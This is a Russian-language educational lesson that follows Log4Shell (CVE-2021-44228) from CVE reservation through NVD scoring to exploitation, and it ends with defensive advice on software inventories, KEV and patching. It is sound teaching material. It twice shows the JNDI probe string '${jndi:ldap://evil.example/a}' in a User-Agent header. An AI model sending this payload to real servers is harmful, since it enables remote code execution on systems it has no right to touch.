## Шаги

### `reserve` Номер занят

`cna → list` · `legit`
Сообщение: резерв номера · Итог: занят

```text
CVE-2021-44228   состояние: RESERVED   с 2021-11-26
```

#### Просто

Apache узнаёт об ошибке в своей библиотеке журнала Log4j и **занимает номер** для неё. Номер
уже есть, но что за ошибка, пока не сказано: исправление ещё не готово.

#### По шагам

Номер выдаёт не кто угодно, а CNA — организация, которой программа CVE разрешила это делать
для своих продуктов. Apache — такая организация. Номер забронирован 26 ноября 2021 года.

#### Глубже

Номер устроен так: `CVE`, год, затем четыре цифры или больше. Год значит год бронирования или
публикации, а не год, когда ошибку нашли. По записи CVE, ошибку обнаружил Чэнь Чжаоцзюнь из
команды безопасности Alibaba Cloud. У записи три состояния: Reserved (номер занят), Published
(опубликована), Rejected (номер отозван, но остаётся в списке).

### `publish` Запись опубликована

`cna → list` · `legit`
Сообщение: запись CVE · Итог: опубликована

```text
Номер:     CVE-2021-44228
Источник:  Apache Software Foundation
Продукт:   Apache Log4j2
Версии:    2.0-beta9 … 2.15.0, кроме 2.12.2, 2.12.3, 2.3.1
Слабости:  CWE-502, CWE-400, CWE-20
Ссылки:    бюллетени, исправления, разборы
```

#### Просто

10 декабря 2021 года Apache публикует **запись**: какой продукт, какие версии, в чём ошибка и
где читать подробности. Это и есть паспорт уязвимости.

#### По шагам

Обязательный минимум записи: номер, короткое описание, затронутые продукты и версии, ссылки.
Здесь описание говорит: в Log4j2 подстановки JNDI не защищены от LDAP-серверов атакующего, и
тот, кто управляет текстом журнала, может выполнить свой код.

#### Глубже

Читайте поля внимательно. В тексте описания версии идут «по 2.15.0», а в машиночитаемом списке
версий 2.15.0 уже отмечена как исправленная; выпуски 2.12.2, 2.12.3 и 2.3.1 исключены. Описание
уточняет, что ошибка только в `log4j-core`. В записи Apache три класса слабостей, а не один:
запись может называть несколько.

### `enrich` NVD добавляет оценку

`list → nvd` · `legit`
Сообщение: запись · Итог: CVSS 10.0

```text
CVSS 3.1:  10.0  AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
CWE (NVD): CWE-917
Продукты:  диапазоны версий log4j (CPE)
```

#### Просто

NVD — база уязвимостей правительства США — берёт запись и **дополняет** её: оценкой тяжести
CVSS, классом ошибки и точным списком затронутых продуктов.

#### По шагам

Оценка 10.0 из 10 — высшая. К трём слабостям из записи Apache NVD добавила свою: CWE-917,
инъекция в язык выражений. Список продуктов в NVD машиночитаемый: по нему программы проверки
находят уязвимые версии сами.

#### Глубже

CVE — это номер, CWE — класс ошибки, CVSS — шкала тяжести; у одной CVE может быть несколько CWE.
Сама программа CVE оценок не выставляет: их дают NVD, производители и другие участники. CISA
внесла эту CVE в каталог KEV в тот же день, 10 декабря 2021 года, со сроком исправления для
федеральных ведомств США до 24 декабря.

### `missed` Запись не заметили

`server → server` · `legit` · `without-defence`
Сообщение: забыли · Итог: Log4j 2.14.1

#### Просто

Владелец магазина не знает, что в его сервере есть Log4j: она пришла **внутри** другой
программы. Запись CVE он не читал.

#### По шагам

Версия 2.14.1 попадает в затронутый диапазон. Сервер уязвим, и об этом уже знает весь мир.

#### Глубже

Найти себя в записи можно, только если знаешь свои версии. Без списка компонентов запись CVE
бесполезна: её некому сверить.

### `matched` Сверка со списком

`nvd → server` · `safe` · `with-defence`
Сообщение: есть · Итог: обновлено

#### Просто

Владелец ведёт **список** всех программ и библиотек с версиями. Проверка находит Log4j 2.14.1
в записи NVD, и библиотеку обновляют.

#### По шагам

Сверка идёт по списку продуктов из NVD. Совпадение — сигнал: читать ссылки записи и ставить
исправленную версию.

#### Глубже

Позже у Log4j нашлись связанные ошибки, и CISA рекомендовала версию 2.17.1 для Java 8. Поэтому
после записи CVE стоит смотреть и бюллетень производителя: он новее.

### `probe` Проба атакующего

`attacker → server` · `attack` · `without-defence`
Сообщение: проба · Итог: выполнена

```http
User-Agent: ⟦${jndi:ldap://evil.example/a}⟧
```

#### Просто

Атакующий тоже читает записи CVE. Он рассылает пробу по тысячам серверов, и этот **отвечает**:
библиотека выполняет строку.

#### По шагам

Как именно работает эта атака, показывает урок K1. Здесь важно другое: атакующему хватило
открытой записи.

#### Глубже

В ATT&CK это T1190 — использование приложения, открытого в интернет. Вектор CVSS из записи
говорит то же: по сети, без входа и без действий человека.

### `owned` Сервер захвачен

`server → attacker` · `attack` · `without-defence`
Сообщение: доступ · Итог: захвачен

#### Просто

Код атакующего работает на сервере магазина. Номер, описание и исправление давно были
опубликованы.

#### По шагам

Атакующий получает командную строку сервера и доступ к его данным.

#### Глубже

Запись CVE одинаково открыта защитнику и атакующему. Выигрывает тот, кто прочитал её раньше и
сделал из неё выводы.

### `refused` Проба на обновлённом сервере

`attacker → server` · `attack` · `with-defence` · `stopped`
Сообщение: проба · Итог: просто текст

```http
User-Agent: ⟦${jndi:ldap://evil.example/a}⟧
```

#### Просто

Та же проба приходит на сервер, где библиотеку уже обновили. Строка остаётся **просто текстом**
в журнале.

#### По шагам

Исходящего соединения нет, чужой код не загружается. Атакующий идёт искать следующий сервер.

#### Глубже

След пробы в журнале полезен: по нему видно, что вас искали, и можно проверить другие серверы.

## Как защититься

- **Знать свои компоненты.** Список всех программ и библиотек с версиями, включая те, что
  пришли внутри других программ.
- **Сверять со свежими записями.** Регулярно сравнивать список с новыми записями CVE и данными
  NVD о продуктах.
- **Начинать с KEV.** Если уязвимость в каталоге KEV, её уже используют в атаках: чинить первой.
- **Читать бюллетень производителя.** Запись CVE даёт ссылки; рекомендуемая версия бывает новее
  той, что названа в описании.
- **Обновлять, а не ждать.** Номер CVE не защищает: защищает установленное исправление.
